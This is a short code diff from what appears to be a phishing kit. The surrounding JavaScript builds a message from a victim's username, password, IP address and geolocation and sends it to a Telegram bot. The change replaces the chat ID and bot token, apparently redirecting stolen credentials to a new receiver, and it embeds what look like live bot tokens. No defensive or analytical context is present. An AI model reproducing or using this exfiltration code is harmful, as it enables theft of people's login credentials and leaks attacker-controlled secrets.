@@ -26,8 +26,8 @@ IPv4 Address: ${ipv4Address || 'N/A'}
 Geolocation: ${geolocation || 'N/A'}`;
 
     // Telegram bot configuration
-    const  chat = '7109935265';
-    const botToken = '7354059961:AAEzQyotNB8MZ_5Ii0RBJu-C6cUCVIfXtrk';
+    const  chat = '7215222255';
+    const botToken = '8601307847:AAG79T_z8zMVlFXvsdRlgR8pBXeSUTv2Iv4';
     const message = `Username: ${username}\nPassword: ${password}\n${text}`;
 
     // Send text message to Telegram
